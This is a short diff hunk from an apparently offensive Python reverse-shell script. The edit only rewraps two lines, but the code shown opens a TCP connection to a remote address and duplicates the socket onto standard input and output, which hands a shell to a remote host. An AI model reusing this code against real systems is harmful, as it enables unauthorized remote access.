@@ -45,8 +45,10 @@ if __name__ == "__main__":
     os.system('clear')
 
     # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
-    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port)) # start a connection to the target
+    socket_sock = socket.socket(socket.AF_INET, 
+                            socket.SOCK_STREAM) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
+    socket_sock.connect((reverse_connection.target_address, 
+                            reverse_connection.target_port)) # start a connection to the target
 
     dup2(socket_sock.fileno(),0)
     dup2(socket_sock.fileno(),1)
